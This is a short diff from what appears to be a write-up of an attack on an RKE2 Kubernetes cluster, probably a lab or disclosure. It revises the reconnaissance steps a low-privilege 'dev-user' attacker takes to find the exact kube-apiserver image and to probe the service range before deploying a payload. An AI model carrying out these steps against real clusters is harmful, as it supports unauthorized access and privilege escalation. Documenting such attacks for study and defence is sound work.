@@ -126,10 +126,9 @@ EOF
 The attacker (`dev-user`) identifies the cluster version and node info to prepare the payload.
 
 ```bash
-# 1. Format the RKE2 Image name (Fixes the versioning plus-sign issue)
-export RAW_VERSION=$(kubectl --kubeconfig=dev-user.config version | grep 'Server Version' | awk '{print $3}')
-export CLEAN_VERSION=$(echo $RAW_VERSION | sed 's/+/ /g' | awk '{print $1"-"$2}')
-export API_IMAGE="rancher/hardened-kubernetes:${CLEAN_VERSION}-build20251210"
+# 1. Get the exact image the real API server is using (works for any RKE2 version/build)
+export API_IMAGE=$(sudo grep -m1 '^\s*image:' /var/lib/rancher/rke2/agent/pod-manifests/kube-apiserver.yaml | awk '{print $2}')
+echo "API image: $API_IMAGE"
 
 # 2. Deploy a probe pod to find the Service Range
 kubectl --kubeconfig=dev-user.config run probe-pod --image=nginx -n dev-space
